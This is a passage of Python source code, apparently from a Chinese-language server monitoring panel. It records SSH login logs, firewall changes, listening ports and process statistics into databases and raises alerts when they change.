            #     last_5_min_values = [s['last_5_min'] for s in loadavg_samples_5]
            #     last_15_min_values = [s['last_15_min'] for s in loadavg_samples_15]
            #     avg2_last_1_min = self.get_average(last_1_min_values)
            #     avg2_last_5_min = self.get_average(last_5_min_values)
            #     avg2_last_15_min = self.get_average(last_15_min_values)
            #
            #
            #
            #     # if sum(last_1_min_values) > 0:
            #     #     avg1_last_1_min = sum(last_1_min_values) / 20
            #     #     last_1_min_values_above_avg1 = [v for v in last_1_min_values if v >= avg1_last_1_min]
            #     #     avg2_last_1_min = sum(last_1_min_values_above_avg1) / len(last_1_min_values_above_avg1)
            #     #
            #     # else:
            #     #     avg2_last_1_min = 0
            #     # if sum(last_5_min_values) > 0:
            #     #     avg1_last_5_min = sum(last_5_min_values) / 20
            #     #     last_5_min_values_above_avg1 = [v for v in last_5_min_values if v >= avg1_last_5_min]
            #     #     avg2_last_5_min = sum(last_5_min_values_above_avg1) / len(last_5_min_values_above_avg1)
            #     # else:
            #     #     avg2_last_5_min = 0
            #     # if sum(last_15_min_values) > 0:
            #     #     avg1_last_15_min = sum(last_15_min_values) / 20
            #     #     last_15_min_values_above_avg1 = [v for v in last_15_min_values if v >= avg1_last_15_min]
            #     #     avg2_last_15_min = sum(last_15_min_values_above_avg1) / len(last_15_min_values_above_avg1)
            #     # else:
            #     #     avg2_last_15_min = 0
            #
            #     if avg2_last_1_min + avg2_last_5_min + avg2_last_15_min > 0:
            #         serv_loadavg_insert_data = {
            #             'sid': sid,
            #             'last_1_min': round(avg2_last_1_min, 2),
            #             'last_5_min': round(avg2_last_5_min, 2),
            #             'last_15_min': round(avg2_last_15_min, 2)
            #         }
            #
            #     # 删除临时数据
            #     db_tmp.query() \
            #         .name('server_loadavg_info_list') \
            #         .where('sid=?', sid) \
            #         .where('create_time<?', save_time_line) \
            #         .delete()
            #
            # # # 更新主机信息
            # # with monitor_db_manager.db_mgr() as db:
            # #     try:
            # #         # 关闭事务自动提交
            # #         db.autocommit(False)
            # #
            # #         # 首先尝试更新主机详细信息
            # #         update_data = {
            # #             'host_info': json.dumps(systeminfo['host']),
            # #             'cpu_info': json.dumps(systeminfo['cpu']),
            # #             'mem_info': json.dumps(systeminfo['mem']),
            # #             'disk_info': json.dumps(systeminfo['disk_list']),
            # #             'net_info': json.dumps(systeminfo['net_io_list']),
            # #             'load_avg': json.dumps(systeminfo.get('loadavg', {})),
            # #             'update_time': cur_time,
            # #         }
            # #
            # #         server_type_dict = {
            # #             "linux": 0,
            # #             "windows": 1,
            # #         }
            # #
            # #         server_type = server_type_dict.get(str(systeminfo['host'].get("os", "")).lower())
            # #         if server_type is not None:
            # #             # 修改主机系统类别
            # #             db.query() \
            # #                 .name('servers') \
            # #                 .where('`sid` = ?', int(sid)) \
            # #                 .update({"type": server_type})
            # #
            # #         up_ret = db.query() \
            # #             .name('server_details') \
            # #             .where('`sid` = ?', int(sid)) \
            # #             .update(update_data)
            # #         if up_ret == 0 \
            # #                 and not db.query() \
            # #                 .name('server_details') \
            # #                 .where('`sid` = ?', int(sid)) \
            # #                 .field('sid') \
            # #                 .exists():
            # #
            # #             # 使用非阻塞模式
            # #             db.set_blocking(False)
            # #
            # #             # 更新失败且数据不存在则插入
            # #             update_data['sid'] = sid
            # #             db.query() \
            # #                 .name('server_details') \
            # #                 .insert(update_data, get_rowid=False)
            # #
            # #         # 提交事务
            # #         db.commit()
            # #     except BaseException as e:
            # #         # 回滚事务
            # #         db.rollback()
            # #
            # #         # 记录异常堆栈信息
            # #         public.print_exc_stack(e)
            # #
            # #         return False
            #
            # # 获取数据库管理对象
            # db_mgr = monitor_db_manager.MonitorDbManager(sid)
            #
            # # 写入数据
            # if serv_cpu_insert_data is not None:
            #     db_mgr.add('server_cpu_info_list', serv_cpu_insert_data, option='ignore')
            #
            # if serv_mem_insert_data is not None:
            #     db_mgr.add('server_mem_info_list', serv_mem_insert_data, option='ignore')
            #
            # if serv_swap_insert_data is not None:
            #     db_mgr.add('server_swap_info_list', serv_swap_insert_data, option='ignore')
            #
            # if serv_disk_insert_data is not None:
            #     db_mgr.add('server_disk_info_list', serv_disk_insert_data, option='ignore')
            #
            # if serv_net_insert_data is not None:
            #     db_mgr.add('server_net_info_list', serv_net_insert_data, option='ignore')
            #
            # if serv_loadavg_insert_data is not None:
            #     db_mgr.add('server_loadavg_info_list', serv_loadavg_insert_data, option='ignore')


        panel_info = systeminfo.get("panel_info")
        if panel_info is not None:
            path = '{}/data/monitor_servers/{}/panel_version.pl'.format(public.get_panel_path(), public.md5(str(sid)))
            version = panel_info.get("version")
            public.writeFile(path, version)
        return ret_flag

    def store_ssh_login_logs(self, sid, ssh_login_logs):
        '''
            @name 将SSH登录信息写入数据库
            @author Zhj<2022-06-28>
            @param sid<integer>         主机ID
            @param ssh_login_logs<list> SSH登录日志
            @return bool
        '''
        from core.include.monitor_helpers import async_call_queue
        async_call_queue.add_task_easy(self.__store_ssh_login_logs, sid, ssh_login_logs)

    def __store_ssh_login_logs(self, sid, ssh_login_logs):
        '''
            @name 将SSH登录信息写入数据库（辅助函数）
            @author Zhj<2022-06-28>
            @param sid<integer>         主机ID
            @param ssh_login_logs<list> SSH登录日志
            @return bool
        '''
        # 检查主机是否在线
        # 检查磁盘空间占用是否过高
        # if not self.server_is_online(sid) or self.running_dir_used_percent_high():
        if self.running_dir_used_percent_high():
            return False

        if isinstance(ssh_login_logs, str):
            try:
                ssh_login_logs = json.loads(ssh_login_logs)
            except:
                return False

        ret_flag = True

        # 获取本月开始时间
        # now_time = time.localtime()
        # month_begin = int(time.mktime((now_time.tm_year, now_time.tm_mon, 1, 0, 0, 0, 0, 0, 0)))

        # 获取数据库管理对象
        # db_mgr = monitor_db_manager.MonitorDbManager(sid)

        # SSH登录日志批量插入数据
        ssh_insert_data = []

        # SSH登录状态
        login_status = None

        # 登录IP与下标
        login_ip_idx_map = {}
        i = 0

        # 获取当前时间
        cur_time = int(time.time())

        # 每日SSH登录统计
        # {day_time: {success_cnt, fail_cnt, ip_cnt, user_cnt}, ...}
        ssh_daily = {}

        for ssh_login_log in ssh_login_logs:
            # 跳过非本月数据
            # if ssh_login_log['time'] < month_begin:
            #     continue

            try:
                # SSH登录时间大于当前时间的跳过
                if cur_time < int(ssh_login_log.get('time', 0)):
                    continue

                login_ip = ssh_login_log.get('IP', '')
                login_port = int(ssh_login_log.get('port', 0))
                login_user = ssh_login_log.get('user', '')

                ssh_insert_data.append({
                    'sid': sid,
                    'ip': login_ip,
                    'port': login_port,
                    'user': login_user,
                    'success': 1 if ssh_login_log['status'] else 0,
                    'login_time': int(ssh_login_log['time']),
                    'ip_place': '',
                })

                # 获取当天0点Unix时间戳
                loc_time = time.localtime(int(ssh_login_log['time']))
                today = time.mktime((loc_time.tm_year, loc_time.tm_mon, loc_time.tm_mday, 0, 0, 0, 0, 0, 0))

                # 统计SSH当天登录情况
                if today not in ssh_daily:
                    ssh_daily[today] = {
                        'success': 0,
                        'fail': 0,
                        'ip_cnt': {},
                        'user_cnt': {},
                    }

                if login_ip not in ssh_daily[today]['ip_cnt']:
                    ssh_daily[today]['ip_cnt'][login_ip] = {
                        'success': 0,
                        'fail': 0,
                        'ports': set(),
                        'ip_place': '',
                    }

                if len(login_user) > 0 and login_user not in ssh_daily[today]['user_cnt']:
                    ssh_daily[today]['user_cnt'][login_user] = {
                        'success': 0,
                        'fail': 0,
                    }

                ssh_daily[today]['ip_cnt'][login_ip]['ports'].add(login_port)

                k = 'fail'

                # 登录成功
                if ssh_login_log['status']:
                    login_status = 'success'
                    k = 'success'

                ssh_daily[today][k] += 1
                ssh_daily[today]['ip_cnt'][login_ip][k] += 1

                if login_user in ssh_daily[today]['user_cnt']:
                    ssh_daily[today]['user_cnt'][login_user][k] += 1

                # 记录登录IP与下标
                if login_ip != '':
                    if login_ip not in login_ip_idx_map:
                        login_ip_idx_map[login_ip] = []

                    login_ip_idx_map[login_ip].append(i)

                i += 1
            except BaseException as e:
                # 打印异常堆栈
                public.print_exc_stack(e)

                continue

        # 批量插入SSH登录日志
        if len(ssh_insert_data) > 0:
            # 查询IP信息
            ip_info_dict = self.search_ip_info(list(login_ip_idx_map.keys()))

            # 将IP信息更新到SSH登录信息上
            for (login_ip, idx_list) in login_ip_idx_map.items():
                if login_ip not in ip_info_dict:
                    continue

                # 拼接IP归属地信息
                ip_place = ip_info_dict[login_ip]['country'] + ip_info_dict[login_ip]['province']

                for idx in idx_list:
                    ssh_insert_data[idx]['ip_place'] = ip_place

                    with Locker.acquire(self.UPDATE_LATEST_SSH_LOGIN_LOGS_LOCK, timeout=5):
                        self.LATEST_SSH_LOGIN_LOGS.append(copy.deepcopy(ssh_insert_data[idx]))

                        # 当长度超过20个时，删除首个元素
                        if len(self.LATEST_SSH_LOGIN_LOGS) > 20:
                            del (self.LATEST_SSH_LOGIN_LOGS[0])

                for k, v in ssh_daily.items():
                    if login_ip in v['ip_cnt']:
                        ssh_daily[k]['ip_cnt'][login_ip]['ip_place'] = ip_place

            # 更新每日统计数据时，需要上锁，防止并发导致重复统计
            with Locker.acquire(self.__UPDATING_SSH_LOGIN_LOG_DAILY, timeout=5):
                for today, v in ssh_daily.items():
                    # SSH登录统计(每天)
                    with monitor_db_manager.db_mgr('ssh_login_total_daily') as db:
                        # 关闭事务自动提交
                        db.autocommit(False)

                        # 设置非阻塞
                        # db.set_blocking(False)

                        # 不存在时新增
                        if not db.query()\
                            .name('ssh_login_total_daily')\
                            .where('sid', sid)\
                            .where('day_time', today)\
                            .field('id')\
                            .exists():
                            db.query().name('ssh_login_total_daily').insert({
                                'sid': sid,
                                'day_time': today,
                                'success': v['success'],
                                'fail': v['fail'],
                            }, get_rowid=False)
                        else:
                            # 更新登录统计
                            db.query()\
                                .name('ssh_login_total_daily')\
                                .where('sid', sid)\
                                .where('day_time', today)\
                                .increment('success', v['success'])\
                                .increment('fail', v['fail'])\
                                .update()

                        # 提交事务
                        db.commit()

                    # SSH登录IP统计(每天)
                    with monitor_db_manager.db_mgr('ssh_login_ip_total_daily') as db:
                        # 关闭事务自动提交
                        db.autocommit(False)

                        # 设置非阻塞
                        # db.set_blocking(False)

                        insert_data = []

                        for login_ip, ip_cnt_info in v['ip_cnt'].items():
                            # 不存在时新增
                            if not db.query()\
                                    .name('ssh_login_ip_total_daily')\
                                    .where('sid', sid) \
                                    .where('ip', login_ip)\
                                    .where('day_time', today)\
                                    .field('id')\
                                    .exists():
                                insert_data.append({
                                    'sid': sid,
                                    'ip': login_ip,
                                    'ports': json.dumps(list(ip_cnt_info['ports'])),
                                    'success': ip_cnt_info['success'],
                                    'fail': ip_cnt_info['fail'],
                                    'ip_place': ip_cnt_info['ip_place'],
                                    'day_time': today,
                                })
                                continue

                            ssh_login_ip_total_daily_info = db.query()\
                                .name('ssh_login_ip_total_daily')\
                                .where('sid', sid)\
                                .where('ip', login_ip)\
                                .where('day_time', today)\
                                .field('id', 'ports')\
                                .find()

                            ip_ports = json.loads(ssh_login_ip_total_daily_info['ports'])
                            ip_ports.extend(list(ip_cnt_info['ports']))
                            ip_ports = list(set(ip_ports))

                            db.query()\
                                .name('ssh_login_ip_total_daily')\
                                .where('id', ssh_login_ip_total_daily_info['id'])\
                                .increment('success', ip_cnt_info['success'])\
                                .increment('fail', ip_cnt_info['fail'])\
                                .update({
                                    'ports': json.dumps(ip_ports),
                                })

                        if len(insert_data) > 0:
                            db.query()\
                                .name('ssh_login_ip_total_daily')\
                                .insert_all(insert_data)

                        # 提交事务
                        db.commit()

                    # SSH登录用户统计(每天)
                    with monitor_db_manager.db_mgr('ssh_login_user_total_daily') as db:
                        # 关闭事务自动提交
                        db.autocommit(False)

                        # 设置非阻塞
                        # db.set_blocking(False)

                        insert_data = []

                        for login_user, user_cnt_info in v['user_cnt'].items():
                            # 不存在时新增
                            if not db.query()\
                                .name('ssh_login_user_total_daily')\
                                .where('sid', sid)\
                                .where('user', login_user)\
                                .where('day_time', today)\
                                .field('id')\
                                .exists():
                                insert_data.append({
                                    'sid': sid,
                                    'user': login_user,
                                    'success': user_cnt_info['success'],
                                    'fail': user_cnt_info['fail'],
                                    'day_time': today,
                                })
                                continue

                            db.query()\
                                .name('ssh_login_user_total_daily')\
                                .where('sid', sid)\
                                .where('user', login_user)\
                                .where('day_time', today)\
                                .increment('success', user_cnt_info['success'])\
                                .increment('fail', user_cnt_info['fail'])\
                                .update()

                        if len(insert_data) > 0:
                            db.query()\
                                .name('ssh_login_user_total_daily')\
                                .insert_all(insert_data)

                        # 提交事务
                        db.commit()

            # 实例化云监控数据库管理对象
            db_mgr = monitor_db_manager.MonitorDbManager(sid)
            # 去除sid
            for item in ssh_insert_data:
                del (item['sid'],)

            # SSH登录日志
            with db_mgr.db_sgl('ssh_login_logs') as db:
                try:
                    # 关闭事务自动提交
                    db.autocommit(False)

                    # 设置非阻塞
                    # db.set_blocking(False)

                    # 批量插入
                    db.query() \
                        .name('ssh_login_logs') \
                        .insert_all(ssh_insert_data)

                    # 提交事务
                    db.commit()
                except BaseException as e:
                    # 回滚事务
                    db.rollback()

                    # 记录异常堆栈
                    public.print_exc_stack(e)

                    ret_flag = False

            # # 插入到本月SSH登录日志数据库
            #
            # insert_data_month = []
            # # 找出本月的数据
            # today = datetime.date.today()
            # first_day = datetime.date(today.year, today.month, 1)
            # # 当月第一天
            # timestamp = int(time.mktime(first_day.timetuple()))
            #
            # cur_month = int(time.strftime('%Y%m', time.localtime(int(cur_time))))
            # db_name_tmp = 'ssh_login_logs_{}'.format(cur_month)  # 本月数据库
            # for item in ssh_insert_data:
            #
            #     if item['login_time'] >= timestamp:
            #         item['sid'] = sid
            #         insert_data_month.append(item)
            #
            # # 批量插入 本月数据
            # with db_mgr('{}/{}'.format('monitor_databases', db_name_tmp)) as db:
            #     # 关闭自动提交事务
            #     db.autocommit(False)
            #
            #     # 新增记录
            #     db.query() \
            #         .name(db_name_tmp) \
            #         .insert_all(insert_data_month)
            #
            #     # 提交事务
            #     db.commit()

        # SSH异地登录告警
        self.warn_server_ssh_login_place_other(sid, login_status)

        return ret_flag

    def store_firewall_info(self, sid, firewall_info):
        '''
            @name 将系统防火墙信息写入数据库
            @author Zhj<2022-06-28>
            @param sid<integer>         主机ID
            @param firewall_info<dict>  系统防火墙信息
            @return bool
        '''
        # 检查主机是否在线
        # 检查磁盘空间占用是否过高
        # if not self.server_is_online(sid) or self.running_dir_used_percent_high():
        # return False
        if self.running_dir_used_percent_high():
            return False

        if isinstance(firewall_info, str):
            try:
                firewall_info = json.loads(firewall_info)
            except:
                return False

        # ret_flag = True
        #
        # # 获取数据库对象
        # with public.sqlite_easy(self.__DB_FILE) as db:
        #     try:
        #         # 关闭自动提交事务
        #         db.autocommit(False)
        #
        #         # 首先尝试更新主机详细信息
        #         update_data = {
        #             'firewall_info': json.dumps({
        #                 'is_running': firewall_info['firewall_status'],
        #                 'rules': firewall_info['firewalld_info_list'],
        #                 'rule_change': firewall_info['rule_change'],
        #             }),
        #             'update_time': int(time.time()),
        #         }
        #
        #         up_ret = db.query()\
        #             .name('server_details')\
        #             .where('sid=?', sid)\
        #             .update(update_data)
        #
        #         if up_ret == 0 and not db.query().name('server_details').where('sid=?', sid).exists():
        #             # 更新失败且数据不存在则插入
        #             update_data['sid'] = sid
        #             db.query()\
        #                 .name('server_details')\
        #                 .insert(update_data)
        #
        #         # 系统防火墙规则修改收集
        #         if firewall_info['rule_change']['add'] is not None or firewall_info['rule_change']['del'] is not None:
        #             db.query()\
        #                 .name('firewall_rule_change_logs')\
        #                 .insert({
        #                     'sid': sid,
        #                     'add': None if firewall_info['rule_change']['add'] is None else json.dumps(firewall_info['rule_change']['add']),
        #                     'del': None if firewall_info['rule_change']['del'] is None else json.dumps(firewall_info['rule_change']['del']),
        #                 })
        #
        #         # 防火墙启停收集
        #         last_log = db.query()\
        #             .name('firewall_start_stop_logs')\
        #             .where('sid=?', sid)\
        #             .order('create_time', 'DESC')\
        #             .field('id', 'status')\
        #             .find()
        #
        #         if not last_log or int(last_log['status']) != (1 if firewall_info['firewall_status'] else 0):
        #             db.query()\
        #                 .name('firewall_start_stop_logs')\
        #                 .insert({
        #                     'sid': sid,
        #                     'status': 1 if firewall_info['firewall_status'] else 0,
        #                 })
        #
        #         # 提交事务
        #         db.commit()
        #     except BaseException as e:
        #         # 回滚事务
        #         db.rollback()
        #
        #         ret_flag = False
        #
        #         # 记录异常堆栈
        #         public.print_exc_stack(e)

        ret_flag = True

        # 获取数据库对象
        with monitor_db_manager.db_mgr() as db:
            try:
                # 关闭自动提交事务
                db.autocommit(False)

                # 首先尝试更新主机详细信息
                update_data = {
                    'firewall_info': json.dumps({
                        'is_running': firewall_info['firewall_status'],
                        'rules': firewall_info['firewalld_info_list'],
                        'rule_change': firewall_info['rule_change'],
                    }),
                    'update_time': int(time.time()),
                }

                up_ret = db.query() \
                    .name('server_details') \
                    .where('sid=?', sid) \
                    .update(update_data)

                if up_ret == 0 and not db.query().name('server_details').where('sid=?', sid).exists():
                    # 更新失败且数据不存在则插入
                    update_data['sid'] = sid

                    # 设置非阻塞
                    db.set_blocking(False)

                    db.query() \
                        .name('server_details') \
                        .insert(update_data, get_rowid=False)

                # 提交事务
                db.commit()
            except BaseException as e:
                # 回滚事务
                db.rollback()

                # 记录异常堆栈
                public.print_exc_stack(e)

                return False

        # 是否开启了数据采样
        sampling_opened = self.sampling_global(sid, monitor_enums.SAMPLING_GLOBAL__SERVER)

        # 系统防火墙规则修改记录
        rule_change_insert_data = None

        # 启停记录
        start_stop_insert_data = None

        # 仅当用户开启了数据采样时才记录历史数据
        if sampling_opened:
            # 系统防火墙规则修改收集
            if firewall_info['rule_change']['add'] is not None or firewall_info['rule_change']['del'] is not None:
                rule_change_insert_data = {
                    'sid': sid,
                    'add': '[]' if firewall_info['rule_change']['add'] is None else json.dumps(
                        firewall_info['rule_change']['add']),
                    'del': '[]' if firewall_info['rule_change']['del'] is None else json.dumps(
                        firewall_info['rule_change']['del']),
                }

            # 获取上一次防火墙状态
            last_status_cache_key = 'BT_MONITOR_CACHE__SERVER_FIREWALL_STATUS__{}'.format(sid)
            last_status = public.cache_get(last_status_cache_key)

            # 防火墙状态发生变化
            # 新增启停记录
            if not last_status or int(last_status) != (1 if firewall_info['firewall_status'] else 0):
                last_status = 1 if firewall_info['firewall_status'] else 0
                start_stop_insert_data = {
                    'sid': sid,
                    'status': last_status,
                }

                # 将防火墙状态存入缓存
                public.cache_set(last_status_cache_key, last_status)

            # 写入数据
            if rule_change_insert_data is not None or start_stop_insert_data is not None:
                # 获取数据库管理对象
                db_mgr = monitor_db_manager.MonitorDbManager(sid)

                # 写入系统防火墙规则修改记录
                if rule_change_insert_data is not None:
                    db_mgr.add('firewall_rule_change_logs', rule_change_insert_data)

                # 写入启停记录
                if start_stop_insert_data is not None:
                    db_mgr.add('firewall_start_stop_logs', start_stop_insert_data)

            from core.include.monitor_helpers import warning_obj
            warning_obj.warn_assign(sid, 'safety', 'firewalld', 'percent', rule_change_insert_data,no_threshold=True)

        return ret_flag

    def store_port_info(self, sid, port_info_list):
        '''
            @name 将端口信息写入数据库
            @author Zhj<2022-06-28>
            @param sid<integer>         主机ID
            @param port_info_list<list> 端口监听列表
            @return bool
        '''
        # 检查主机是否在线
        # 检查磁盘空间占用是否过高
        # if not self.server_is_online(sid) or self.running_dir_used_percent_high():
        # return False
        if self.running_dir_used_percent_high():
            return False

        if isinstance(port_info_list, str):
            try:
                port_info_list = json.loads(port_info_list)
            except:
                return False

        # 进程名称与进程启动路径插入数据
        pne_insert_data = []

        # 去重
        distinct_ports = {}
        for port_info in port_info_list['listening_port_list']:
            k, _ = mmh3.hash64('{}|{}|{}|{}'.format(
                sid,
                port_info['listen_address'],
                port_info['listen_port'],
                port_info['protocol']
            ))

            if k in distinct_ports:
                continue

            pne_id = self.get_pne_id(port_info.get('process_name', ''), port_info.get('process_path', ''))
            distinct_ports[k] = {
                'ip': port_info['listen_address'],
                'port': port_info['listen_port'],
                'protocol': port_info['protocol'],
                'pne_id': pne_id,
            }

            pne_insert_data.append({
                'id': pne_id,
                'name': port_info.get('process_name', ''),
                'exe': port_info.get('process_path', ''),
            })

        # 更新进程名称与启动路径
        self.__PROCESS_NAME_EXE_QUEUE.put_nowait(pne_insert_data)

        # 端口告警
        try:
            from core.include.monitor_helpers import warning_obj
            warning_obj.warn_assign(sid, 'safety', 'port', 'percent', distinct_ports)
        except BaseException as e:
            # 记录异常堆栈
            public.print_exc_stack(e)

        ret_flag = True

        # 获取数据库对象
        with monitor_db_manager.db_mgr() as db:
            try:
                # 关闭自动提交事务
                db.autocommit(False)

                # 首先尝试更新主机详细信息
                update_data = {
                    'port_info': json.dumps(distinct_ports),
                    'update_time': int(time.time()),
                }

                up_ret = db.query() \
                    .name('server_details') \
                    .where('sid=?', sid) \
                    .update(update_data)
                if up_ret == 0 and not db.query().name('server_details').where('sid=?', sid).exists():
                    # 更新失败且数据不存在则插入
                    update_data['sid'] = sid

                    # 设置非阻塞
                    db.set_blocking(False)

                    db.query() \
                        .name('server_details') \
                        .insert(update_data, get_rowid=False)

                # 提交事务
                db.commit()
            except BaseException as e:
                # 回滚事务
                db.rollback()

                ret_flag = False

                # 记录异常堆栈
                public.print_exc_stack(e)

        return ret_flag

    def store_process_info(self, sid, process_list):
        '''
            @name 将进程信息写入数据库
            @author Zhj<2022-07-04>
            @param  sid<integer>        主机ID
            @param  process_list<dict>  进程列表
            @return bool
        '''
        # 检查主机是否在线
        # 检查磁盘空间占用是否过高
        if self.running_dir_used_percent_high():
            return False

        if isinstance(process_list, str):
            try:
                process_list = json.loads(process_list)
            except:
                return False

        # 清理无效的进程缓存数据
        self.__clear_invalid_cached_process_data()

        ret_flag = True

        # 获取当前时间
        cur_time = int(time.time())

        # 进程磁盘IO收集批量插入数据
        disk_insert_data = []

        # 进程CPU使用率收集批量插入数据
        cpu_insert_data = []

        # 进程内存占用信息收集批量插入数据
        mem_insert_data = []

        # 进程文件打开数收集批量插入数据
        opened_files_insert_data = []

        # 进程网络连接数收集批量插入数据
        opened_connections_insert_data = []

        # 进程线程数收集批量插入数据
        opened_threads_insert_data = []

        # 进程信息(名称+启动路径)插入数据
        pne_insert_data = []

        # 是否开启了数据采样
        sampling_opened = self.sampling_global(sid, monitor_enums.SAMPLING_GLOBAL__PROCESS)

        # 各状态进程数量收集批量插入数据
        # process_infos_insert_data = {
        #     'sid': sid,
        #     'total': 0,
        #     'running': 0,
        #     'sleep': 0,
        #     'stop': 0,
        #     'zombie': 0,
        # }

        # 匹配已经被kill掉的进程
        # skip_boot_command_pattern = re.compile(r'\(deleted\)$')

        try:
            mem_total = None

            # 优先从内存中获取主机内存总大小
            if sid in self.__CACHED_SERVER_MEM_TOTAL:
                mem_total = self.__CACHED_SERVER_MEM_TOTAL[sid]

            # 其次从数据库获取
            else:
                # 获取主机总内存
                mem_info = self.db_easy('server_details') \
                    .where('`sid` = ?', int(sid)) \
                    .value('mem_info')

                try:
                    mem_total = json.loads(mem_info)['total']
                except:
                    raise BtMonitorException('MEM TOTAL数据异常')

                # 存入内存中
                self.__CACHED_SERVER_MEM_TOTAL[sid] = mem_total

            mem_total = int(mem_total)

            data = []
            for k, v in process_list.items():
                v["key"] = k
                v["cpu_percent"] = round(v['cpu_percent'], 2)
                v["mem_percent"] = round(int(v['memory_used']) / mem_total * 100, 2)
                data.append(v)

            new_data = data

            # 当主机进程数超过30个时，排序取前50个
            if len(data) > 30:
                new_data = sorted(data, key=lambda i: (i["cpu_percent"] + i["mem_percent"]), reverse=True)[:50]

            # 将最近10分钟的进程列表写入内存
            if sid not in self.__PROCESS_LIST_STORED_IN_MEMORY:
                with Locker.acquire(self.__STORE_PROCESS_LOCK, timeout=5):
                    for _ in range(1):
                        if sid in self.__PROCESS_LIST_STORED_IN_MEMORY:
                            break

                        if self.db_easy('processes') \
                                .where('sid=?', sid) \
                                .where('update_time > ?', cur_time - 600) \
                                .field('id') \
                                .exists():
                            processes = self.db_easy('processes') \
                                .where('sid = ?', sid) \
                                .where('update_time > ?', cur_time - 600) \
                                .field('id', 'sid', 'pne_id', 'status', 'boot_time', 'boot_user', 'opened_files',
                                       'opened_connections', 'opened_threads', 'net_sent_bytes_per_second',
                                       'disk_read_bytes', 'disk_write_bytes', 'disk_read_bytes_per_second',
                                       'disk_write_bytes_per_second', 'net_sent_bytes', 'net_recv_bytes',
                                       'net_recv_bytes_per_second',
                                       'cpu_used_percent', 'mem_used_percent', 'create_time', 'update_time') \
                                .select()

                            self.db_memory('processes').insert_all(processes, option='ignore', blocking=True)

                        # 标记该主机进程列表已加载进内存中
                        self.__PROCESS_LIST_STORED_IN_MEMORY.add(sid)

                        break

            # 处理进程数据
            # with self.acquire('STORING_PROCESS_DATA__{}'.format(sid)):
            for process_info in new_data:
                process_name, boot_command = process_info["key"].split('|', 1)

                pne_id = self.get_pne_id(process_name, boot_command)
                pne_insert_data.append({
                    'id': pne_id,
                    'name': process_name,
                    'exe': boot_command,
                })
                # if skip_boot_command_pattern.search(boot_command):
                #     continue

                cpu_percent = process_info["cpu_percent"]
                mem_percent = process_info['mem_percent']
                mem_used = int(process_info['memory_used'])

                # if cpu_percent<1 or mem_percent<1:
                #    continue

                # public.print_log(process_name, ":", cpu_percent, mem_percent, mem_used)

                # 记录进程实时数据
                realtime_data = {
                    'cpu_percent': cpu_percent,
                    'mem_percent': mem_percent,
                    'mem_used': mem_used,
                }

                # 进程新增数据
                insert_data = {
                    'pne_id': pne_id,
                    # 'name': process_name,
                    'status': process_info['status'][1:-1],
                    'boot_time': int(process_info['create_time']),
                    # 'boot_command': boot_command,
                    'boot_user': process_info['user'],
                    'opened_files': int(process_info['open_files']),
                    'opened_connections': int(process_info['connects']),
                    'opened_threads': int(process_info['threads']),
                    'disk_read_bytes': int(process_info['io_read_bytes']),
                    'disk_write_bytes': int(process_info['io_write_bytes']),
                    'cpu_used_percent': realtime_data['cpu_percent'],
                    'mem_used_percent': realtime_data['mem_percent'],
                    'disk_read_bytes_per_second': 0,
                    'disk_write_bytes_per_second': 0,
                    'update_time': cur_time,
                }

                # 检查是否存在僵尸进程
                if 'zombie' in process_info and int(process_info['zombie']) > 0:
                    insert_data['status'] = 'zombie'

                # 查询进程ID
                process_info_cache_key = '{}|{}|{}'.format(sid, process_name, boot_command)

                res = None

                # 优先从内存中获取
                if process_info_cache_key in self.__CACHED_PROCESSES:
                    res, _ = self.__CACHED_PROCESSES[process_info_cache_key]

                # 其次从数据库获取
                else:
                    # 从数据库中查询并写入内存
                    with Locker.acquire(self.__UPDATE_CACHED_PROCESSES_LOCK, timeout=5):
                        for _ in range(1):
                            if process_info_cache_key in self.__CACHED_PROCESSES:
                                res, _ = self.__CACHED_PROCESSES[process_info_cache_key]
                                break

                            res = self.db_memory('processes') \
                                .where('sid', sid) \
                                .where('pne_id', pne_id) \
                                .field('id', 'boot_time') \
                                .find()

                            if res is None:
                                break

                            self.__CACHED_PROCESSES[process_info_cache_key] = (res, cur_time)
                            break

                process_id = 0 if self.is_empty_result(res) else int(res['id'])

                # 收集进程磁盘信息
                # 获取上一次进程磁盘信息收集时间
                # last_disk_info = proc_disk_io.get(process_id, None)

                disk_info = {
                    'process_id': process_id,
                    'read_bytes_per_second': process_info.get('proc_io_read_bytes', 0),
                    'write_bytes_per_second': process_info.get('proc_io_write_bytes', 0),
                }

                # 查询到上一次收集进程磁盘信息时间
                # 计算磁盘每秒读写字节数
                # if not self.is_empty_result(last_disk_info)\
                #         and int(last_disk_info['create_time']) >= insert_data['boot_time']:
                #     time_diff = cur_time - int(last_disk_info['create_time'])
                #
                #     if time_diff < 1:
                #         disk_info['read_bytes_per_second'] = last_disk_info['read_bytes_per_second']
                #         disk_info['write_bytes_per_second'] = last_disk_info['write_bytes_per_second']
                #     else:
                #         disk_info['read_bytes_per_second'] = round(max(0, insert_data['disk_read_bytes'] - int(res['disk_read_bytes'])) / time_diff)
                #         disk_info['write_bytes_per_second'] = round(max(0, insert_data['disk_write_bytes'] - int(res['disk_write_bytes'])) / time_diff)

                insert_data['disk_read_bytes_per_second'] = disk_info['read_bytes_per_second']
                insert_data['disk_write_bytes_per_second'] = disk_info['write_bytes_per_second']

                try:
                    # 查询到进程ID则更新，没有则新增
                    if int(process_id) == 0:
                        # 从数据中查询一遍，确保没有记录过此进程
                        process_id_tmp = self.db_easy('processes')\
                            .where('sid', sid) \
                            .where('pne_id', pne_id)\
                            .value('id')

                        # 从数据库中查询到了进程ID
                        if process_id_tmp is not None:
                            insert_data['id'] = process_id_tmp

                        # 新增
                        insert_data['sid'] = int(sid)
                        process_id = self.db_memory('processes').insert(insert_data, option='replace')
                    else:
                        # 更新进程数据
                        insert_data['disk_read_bytes_per_second'] = disk_info['read_bytes_per_second']
                        insert_data['disk_write_bytes_per_second'] = disk_info['write_bytes_per_second']

                        # 更新
                        self.db_memory('processes') \
                            .where('id', process_id) \
                            .update(insert_data, blocking=False)
                except BaseException as e:
                    # 记录异常堆栈
                    public.print_exc_stack(e)

                    continue

                if process_id == 0:
                    continue

                # 将进程信息缓存更新到内存中
                with Locker.acquire(self.__UPDATE_CACHED_PROCESSES_LOCK, timeout=5):
                    self.__CACHED_PROCESSES[process_info_cache_key] = ({
                       'id': process_id,
                       'boot_time': insert_data['boot_time'],
                   }, cur_time + 120)

                disk_info['process_id'] = process_id

                # 仅当用户开启了数据采样时，才开始收集采样信息
                if sampling_opened and not self.sampling_closed('global', process_id=process_id):
                    # 收集进程磁盘IO信息
                    # 磁盘IO大于0时才收集
                    if (disk_info['read_bytes_per_second'] > 0 or disk_info[
                        'write_bytes_per_second'] > 0) and not self.sampling_closed('disk_io',
